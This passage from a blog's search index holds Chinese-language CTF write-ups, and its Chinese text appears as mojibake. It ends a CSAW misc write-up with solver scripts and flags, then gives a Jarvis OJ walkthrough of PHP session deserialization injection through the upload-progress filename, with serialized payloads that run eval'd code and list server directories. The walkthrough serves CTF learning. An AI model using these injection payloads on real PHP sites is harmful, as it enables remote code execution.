class="title">__show</span>(<span class="params">self,root</span>):</span></span><br><span class="line">        <span class="keyword">if</span> root!=<span class="literal">None</span>:</span><br><span class="line">            self.result+= <span class="built_in">str</span>(root.data)+<span class="string">&quot;,&quot;</span></span><br><span class="line">            self.__show(root.left)</span><br><span class="line">            self.__show(root.right)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Insert</span>(<span class="params">self,data</span>):</span></span><br><span class="line">        self.root=self.__insert(data,self.root)</span><br><span class="line">        <span class="keyword">return</span> self.root</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Delete</span>(<span class="params">self,data</span>):</span></span><br><span class="line">        self.root=self.__delete(data,self.root)</span><br><span class="line">    <span class="comment">#æ±‚ç»“ç‚¹çš„é«˜åº¦</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getHeight</span>(<span class="params">self,node</span>):</span></span><br><span class="line">        <span class="keyword">if</span> node==<span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line">        <span class="comment">#print node</span></span><br><span class="line">        <span class="keyword">return</span> node.height</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Show</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.__show(self.root)</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    bi=BTree()</span><br><span class="line">    array=[<span class="number">40</span>,<span class="number">84</span>,<span class="number">21</span>,<span class="number">16</span>,<span class="number">50</span>,<span class="number">28</span>,<span class="number">32</span>,<span class="number">10</span>,<span class="number">46</span>,<span class="number">55</span>,<span class="number">22</span>,<span class="number">4</span>,<span class="number">50</span>,<span class="number">76</span>,<span class="number">45</span>,<span class="number">56</span>,<span class="number">42</span>,<span class="number">6</span>,<span class="number">89</span>,<span class="number">99</span>,<span class="number">21</span>,<span class="number">16</span>,<span class="number">72</span>,<span class="number">47</span>,<span class="number">96</span>,<span class="number">29</span>,<span class="number">46</span>,<span class="number">97</span>,<span class="number">10</span>,<span class="number">58</span>,<span class="number">63</span>,<span class="number">83</span>,<span class="number">40</span>,<span class="number">65</span>,<span class="number">24</span>,<span class="number">65</span>,<span class="number">72</span>,<span class="number">100</span>,<span class="number">11</span>,<span class="number">52</span>,<span class="number">57</span>,<span class="number">77</span>,<span class="number">49</span>,<span class="number">61</span>,<span class="number">5</span>,<span class="number">85</span>,<span class="number">73</span>,<span class="number">49</span>,<span class="number">98</span>,<span class="number">90</span>,<span class="number">81</span>,<span class="number">39</span>,<span class="number">12</span>,<span class="number">73</span>,<span class="number">80</span>,<span class="number">19</span>,<span class="number">69</span>,<span class="number">78</span>,<span class="number">27</span>,<span class="number">25</span>,<span class="number">84</span>,<span class="number">92</span>,<span class="number">79</span>,<span class="number">98</span>,<span class="number">21</span>,<span class="number">8</span>,<span class="number">48</span>,<span class="number">2</span>,<span class="number">34</span>,<span class="number">49</span>,<span class="number">35</span>,<span class="number">21</span>,<span class="number">24</span>,<span class="number">86</span>,<span class="number">10</span>,<span class="number">60</span>,<span class="number">39</span>,<span class="number">28</span>,<span class="number">84</span>,<span class="number">80</span>,<span class="number">61</span>,<span class="number">6</span>,<span class="number">73</span>,<span class="number">67</span>,<span class="number">38</span>,<span class="number">78</span>,<span class="number">70</span>,<span class="number">12</span>,<span class="number">3</span>,<span class="number">94</span>,<span class="number">46</span>,<span class="number">10</span>,<span class="number">91</span>,<span class="number">12</span>,<span class="number">14</span>,<span class="number">69</span>,<span class="number">1</span>,<span class="number">81</span>,<span class="number">56</span>,<span class="number">21</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> array:</span><br><span class="line">        bi.Insert(i)</span><br><span class="line">    bi.Show()</span><br><span class="line">    <span class="built_in">print</span> bi.result</span><br></pre></td></tr></table></figure><blockquote><p>flag: flag{HOW_WAS_IT_NAVIGATING_THAT_FOREST?}</p></blockquote><h4 id="Short-Circuit"><a href="#Short-Circuit" class="headerlink" title="Short Circuit"></a>Short Circuit</h4><blockquote><p>Start from the monkeyâ€™s paw and work your way down the high voltage line, for every wire that is branches off has an element that is either on or off. Ignore the first bit. Standard flag format.</p></blockquote><p>å›¾ç‰‡ï¼š<br><img src="https://upload-images.jianshu.io/upload_images/9223743-a7963e27223cfe15.jpg" alt="20180915_074129.jpg"><br>é¢˜éƒ½æ²¡çœ‹æ‡‚â€¦ å¤ªçœŸå®äº†</p><p>ç½‘ä¸Šæœåˆ°å¸ˆå‚…çš„ wpï¼Œå°±æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œç»äº†ï¼š<br><img src="https://upload-images.jianshu.io/upload_images/9223743-4c6491c4d0701a82.jpg" alt="short-circuit.jpg"><br>æ‰“æ‰°äº†ã€‚</p><blockquote><p>flag:flag{owmyhand}</p></blockquote><h4 id="Algebra"><a href="#Algebra" class="headerlink" title="Algebra"></a>Algebra</h4><p>è®¡ç®—ä¸€å…ƒä¸€æ¬¡æ–¹ç¨‹ï¼Œå¼€å§‹æƒ³ä¸€ä¸ªä¸€ä¸ªæ‰‹ç®—ï¼Œå®åœ¨ç®—ä¸åŠ¨ï¼Œå¤ªå¤šäº†ã€‚å†™ä¸ªpythonè„šæœ¬ï¼š</p><p>å› ä¸ºæˆ‘çš„é‚£ä¸ªè®¡ç®—ç®—æ³•å¯èƒ½ä¼šå‡ºé”™â€¦æ‰€ä»¥åŠ äº†æ•è·å¼‚å¸¸ï¼Œæ•è·åˆ°å¼‚å¸¸ç›´æ¥é‡æ–°è¿æ¥â€¦</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve</span>(<span class="params">eq, var=<span class="string">&quot;X&quot;</span></span>):</span></span><br><span class="line">    eq1 = eq.replace(<span class="string">&quot;=&quot;</span>, <span class="string">&quot;-(&quot;</span>) + <span class="string">&quot;)&quot;</span></span><br><span class="line">    c = <span class="built_in">eval</span>(eq1, &#123;var: <span class="number">1j</span>&#125;)</span><br><span class="line">    <span class="keyword">if</span> (-c.real == <span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> -c.real / c.imag</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        time = <span class="number">1</span></span><br><span class="line">        sc = socket.socket()</span><br><span class="line">        host = <span class="string">&quot;misc.chal.csaw.io&quot;</span></span><br><span class="line">        port = <span class="number">9002</span></span><br><span class="line">        addr = (host, port)</span><br><span class="line">        sc.connect(addr)</span><br><span class="line">        <span class="built_in">print</span> sc.recv(<span class="number">1024</span>)</span><br><span class="line">        <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;-----------round &#123;&#125;--------------&quot;</span>.<span class="built_in">format</span>(time)</span><br><span class="line">            data = sc.recv(<span class="number">1024</span>)</span><br><span class="line">            <span class="built_in">print</span> data</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                exit()</span><br><span class="line">            <span class="keyword">if</span> time == <span class="number">1</span>:</span><br><span class="line">                shizi = data.split(<span class="string">&#x27;\n&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                shizi = data.split(<span class="string">&#x27;\n&#x27;</span>)[<span class="number">1</span>]</span><br><span class="line">            result = <span class="built_in">str</span>(solve(shizi))</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&quot;result:&quot;</span>, result</span><br><span class="line">            sc.send(result + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">            time += <span class="number">1</span></span><br><span class="line">    <span class="keyword">except</span> BaseException:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        sc.shutdown(<span class="number">2</span>)</span><br><span class="line">        sc.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure><blockquote><p>flag: flag{y0u_s0_60od_aT_tH3_qU1cK_M4tH5}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Crypto </tag>
            
            <tag> Web </tag>
            
            <tag> Misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP session ååºåˆ—åŒ–</title>
      <link href="/2018/10/03/PHPsession/"/>
      <url>/2018/10/03/PHPsession/</url>
      
        <content type="html"><![CDATA[<h4 id="Session"><a href="#Session" class="headerlink" title="Session"></a>Session</h4><p>sessionå°±æ˜¯æœåŠ¡å™¨ä¸ºç”¨æˆ·æµè§ˆå™¨åˆ›å»ºçš„ä¸€ä¸ªä¿å­˜ç”¨æˆ·ä¿¡æ¯çš„æ–‡ä»¶<br>å­˜å‚¨çš„æ–‡ä»¶æ˜¯ä»¥sess_sessionidæ¥è¿›è¡Œå‘½åçš„ï¼Œæ–‡ä»¶çš„å†…å®¹å°±æ˜¯sessionå€¼çš„åºåˆ—åŒ–ä¹‹åçš„å†…å®¹ã€‚<br>sessionåºåˆ—åŒ–ä¸ååºåˆ—åŒ–æœ‰ä¸‰ç§æ–¹å¼ï¼š</p><a id="more"></a><hr><p><img src="/2018/10/03/PHPsession/picture1.jpg" alt="image"></p><p>phpåªæ˜¯æ¯”php_serializeåºåˆ—åŒ–å¤šå‡ºäº†ä¸€ä¸ªé”®å ï¼‹ ç«–çº¿ ï¼Œé”®åå¯ä»¥æ˜¯ç©ºçš„ï¼Œå¯ä»¥æ³¨å…¥ã€‚  </p><h4 id="Jarvis-OJ-phpinfo"><a href="#Jarvis-OJ-phpinfo" class="headerlink" title="Jarvis OJ phpinfo"></a>Jarvis OJ phpinfo</h4><blockquote><p>çœ‹è¿™é“jarvios oj çš„é¢˜ï¼š</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//A webshell is wait for you</span></span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mdzz;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mdzz = <span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;mdzz);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;phpinfo&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $m = <span class="keyword">new</span> OowoO();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    highlight_string(file_get_contents(<span class="string">&#x27;index.php&#x27;</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>åˆ†æé¢˜ç›® è‚¯å®šæ˜¯è¦é€šè¿‡ååºåˆ—åŒ–å‡ºæ¥OowoOè¿™ä¸ªå¯¹è±¡ï¼ŒæŠŠmdzzè¿™ä¸ªå˜é‡æ”¹æˆæˆ‘ä»¬éœ€è¦æ‰§è¡Œçš„å‘½ä»¤ã€‚  </p><p>åˆ©ç”¨çš„æ˜¯phpçš„sessionè§£æä¸åŒå¯¼è‡´çš„æ³¨å…¥ ï¼Œç”¨serializeæ–¹æ³•åºåˆ—åŒ–ç»“æœå‰é¢åŠ ä¸ª|  å°±æ˜¯php_serializeè§£æçš„å¯¹è±¡ã€‚<br>æ­¤é¢˜ä¹Ÿæ²¡æœ‰ä¼ sessionçš„æ–¹æ³•ï¼Œå‚è€ƒå¸–å­å¾—çŸ¥åˆ©ç”¨Session Upload Progressä¸Šä¼ ä¸ªæ–‡ä»¶,filenameå°±å¯ä»¥ä½œä¸ºsessionçš„å€¼ã€‚  </p><p>é¦–å…ˆæˆ‘ä»¬è¦æœ¬åœ°æ­å»ºç¯å¢ƒï¼Œæ‹¿åˆ°æˆ‘ä»¬æƒ³è¦çš„åºåˆ—åŒ–å€¼ï¼Œä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mdzz;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mdzz = <span class="string">&#x27;echo &quot;hacker&quot;;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;mdzz);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> OowoO();</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¾—åˆ°ç»“æœï¼šO:5:â€OowoOâ€:1:{s:4:â€mdzzâ€;s:14:â€echo â€œhackerâ€;â€;}<br>æ³¨æ„è¿™é‡Œä¸èƒ½æŠŠè¿™ä¸ªç›´æ¥ä¼ è¿‡å»ï¼Œåˆ©ç”¨è§£æå¼•æ“ä¸åŒ è¦åœ¨å‰é¢åŠ ä¸ª| ï¼ˆå¼•å·è¦è½¬ä¹‰ï¼‰<br>ä¹Ÿå°±æ˜¯è¯´ ä¼ è¿›å»çš„filename:|O:5:\â€œOowoO\â€œ:1:{s:4:\â€œmdzz\â€œ;s:14:\â€œecho \â€œhacker\â€œ;\â€œ;}</p><p>æ–°å»ºä¸€ä¸ªhtml:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://web.jarvisoj.com:32784/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ä¸Šä¼ æ–‡ä»¶burpæŠ“åŒ…,æŠŠfilenameæ”¹ä¸ºä¸Šé¢çš„payloadï¼š<br><img src="/2018/10/03/PHPsession/picture2.jpg" alt="image"><br>æ‰§è¡ŒæˆåŠŸ  </p><p>çœ‹ä¸€ä¸‹æ ¹ç›®å½•ï¼š<br>|O:5:&quot;OowoO&quot;:1:{s:4:&quot;mdzz&quot;;s:35:&quot;print_r($_SERVER[&quot;DOCUMENT_ROOT&quot;]);&quot;;}  </p><p><img src="/2018/10/03/PHPsession/picture3.jpg" alt="image"></p><p>è¿›å»çœ‹çœ‹æœ‰ä»€ä¹ˆï¼š<br>|O:5:&quot;OowoO&quot;:1:{s:4:&quot;mdzz&quot;;s:39:&quot;print_r(scandir(â€˜/opt/lampp/htdocs/â€˜));&quot;;}  </p><p><img src="/2018/10/03/PHPsession/picture4.jpg" alt="image"><br>  è¯»flag:<br><img src="/2018/10/03/PHPsession/picture5.jpg" alt="image"></p><p>å‚è€ƒ:  <br><a href="https://blog.spoock.com/2016/10/16/php-serialize-problem/">https://blog.spoock.com/2016/10/16/php-serialize-problem/</a></p><p><a href="https://blog.csdn.net/qq_35078631/article/details/77284684">https://blog.csdn.net/qq_35078631/article/details/77284684</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Web </category>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
